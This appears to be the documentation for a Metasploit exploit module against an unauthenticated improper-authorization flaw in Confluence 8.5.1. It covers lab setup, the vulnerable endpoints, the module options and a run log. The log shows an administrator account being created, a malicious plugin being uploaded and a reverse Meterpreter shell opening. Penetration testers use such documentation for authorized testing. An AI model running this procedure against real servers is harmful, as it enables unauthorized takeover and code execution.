## Vulnerable Application

This Improper Authorization vulnerability allows an unauthenticated attacker to reset Confluence and create a
Confluence instance administrator account. Using this account, an attacker can then perform all
administrative actions that are available to Confluence instance administrator. This module uses the
administrator account to install a malicious .jsp servlet plugin which the user can trigger to gain code
execution on the target in the context of the of the user running the confluence server.

### Setup
Download and install a [vulnerable version of Atlassian Confluence](https://www.atlassian.com/software/confluence/download.).
By default the server will listen for HTTP connections on port 8090. This exploit module was tested against Confluence
8.5.1 running on Windows Server 2022.

After running the installer the setup wizard will ask for a trial license. An Atlassian account is free and required
to obtain the trial licence. A database and a will also be required to run Confluence. Download and install
[PostgreSQL](https://www.enterprisedb.com/downloads/postgres-postgresql-downloads). The setup Wizard will ask for DB
credentials, the default PostgreSQL database can be used.

## Verification Steps

1. Start msfconsole
1. Do: `use atlassian_confluence_unauth_backup`
1. Set the `RHOST`
1. Run the module
1. Receive a Meterpreter session in the context of the user running the Confluence application.

## Options

### CONFLUENCE_TARGET_ENDPOINT

This is the endpoint used to trigger the vulnerability, and must be reachable by an un authenticated HTTP(S) POST
request. The three vulnerable endpoints outlined by Atlassian in the advisory for this vulnerability are as follows:
 - /json/setup-restore.action
 - /json/setup-restore-local.action
 - /json/setup-restore-progress.action'

### CONFLUENCE_PLUGIN_TIMEOUT

The exploit will install a malicious plugin into the Confluence server. Plugin installation is performed asynchronously
and we must poll the server to find out when installation has completed. This option governs the maximum amount
of time to wait for installation to complete. The timeout value is in seconds and by default this option is set to `30`.

## Scenarios
### Windows Server 2022 running Atlassian Confluence 8.5.1
```
msf6 exploit(multi/http/atlassian_confluence_unauth_backup) > set rhost 172.16.199.134
rhost => 172.16.199.134
msf6 exploit(multi/http/atlassian_confluence_unauth_backup) > set verbose true
verbose => true
msf6 exploit(multi/http/atlassian_confluence_unauth_backup) > options

Module options (exploit/multi/http/atlassian_confluence_unauth_backup):

   Name                        Current Setting             Required  Description
   ----                        ---------------             --------  -----------
   CONFLUENCE_PLUGIN_TIMEOUT   30                          yes       The timeout (in seconds) to wait when installing a plugin
   CONFLUENCE_TARGET_ENDPOINT  /json/setup-restore.action  yes       The endpoint used to trigger the vulnerability. (Accepted: /json/setup-restore.action, /json/setup-restore-local.action, /json/setup-restore-progress.action)
   NEW_PASSWORD                LELTtnOG                    yes       Password to be used when creating a new user with admin privileges
   NEW_USERNAME                candace.leffler             yes       Username to be used when creating a new user with admin privileges
   Proxies                                                 no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      172.16.199.134              yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT                       8090                        yes       The target port (TCP)
   SSL                         false                       no        Negotiate SSL/TLS for outgoing connections
   VHOST                                                   no        HTTP server virtual host


Payload options (java/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  172.16.199.1     yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Java



View the full module info with the info, or info -d command.

msf6 exploit(multi/http/atlassian_confluence_unauth_backup) > run

[*] Started reverse TCP handler on 172.16.199.1:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Exploitable version of Confluence: 8.5.1
[*] Setting credentials: candace.leffler:LELTtnOG
[+] Exploit Success! Login Using 'candace.leffler :: LELTtnOG'
[*] Generating payload plugin
[*] Uploading payload plugin
[*] Triggering payload plugin
[*] Deleting plugin...
[*] Sending stage (57692 bytes) to 172.16.199.134
[*] Meterpreter session 6 opened (172.16.199.1:4444 -> 172.16.199.134:50095) at 2023-12-11 18:52:33 -0500

meterpreter > getuid
Server username: WIN-2EEL7BRDUD8$
meterpreter > sysinfo
Computer        : WIN-2EEL7BRDUD8
OS              : Windows Server 2022 10.0 (amd64)
Architecture    : x64
System Language : en_US
Meterpreter     : java/windows
meterpreter >
```
